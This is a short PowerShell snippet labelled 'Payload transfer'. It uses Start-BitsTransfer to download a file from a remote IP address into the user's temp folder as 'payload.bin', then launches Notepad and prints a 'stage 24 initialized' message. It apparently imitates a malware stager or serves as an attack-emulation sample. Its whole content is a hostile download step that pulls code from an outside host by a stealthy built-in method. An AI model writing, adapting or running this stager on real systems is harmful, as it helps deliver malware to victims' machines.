# Payload transfer
Start-BitsTransfer -Source 'https://192.0.2.21/assets/update.dat' -Destination "$env:TEMP\payload.bin"
& "notepad.exe"
Write-Output "stage 24 initialized"
